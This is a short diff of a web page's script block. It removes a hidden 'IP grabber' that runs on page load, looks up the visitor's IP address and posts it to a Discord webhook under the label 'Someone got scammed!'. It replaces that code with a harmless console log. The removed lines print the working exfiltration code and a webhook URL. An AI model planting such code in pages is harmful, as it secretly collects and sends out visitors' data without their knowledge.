@@ -1,12 +1,4 @@
 <script>
-const wurl = "https://discord.com/api/webhooks/1097951398173360198/yUfeeJeFTO_C3B_y1RZnWNTfogulB1cTstdU37F_Zj9EkVE7Lz3b0xKUf6Rkt8FclVMK" // I've deleted it, don't waste your time on it
-async function run() {
-	res = await fetch("https://api.ipify.org/")
-	ip = await res.text()
-	body = {"username":"IP grabber", "embeds":[
-		{"title":"Someone got scammed!", "description":`Here's their ip: ${ip}.`, "footer":{"text":"OyoPlayer IP Grabber"}}
-	]}
-	fetch(wurl, {"method":"POST", "headers":{"content-type": "application/json"}, "body":JSON.stringify(body)})
-}
-run()
+const test = window.test
+console.log(test)
 </script>
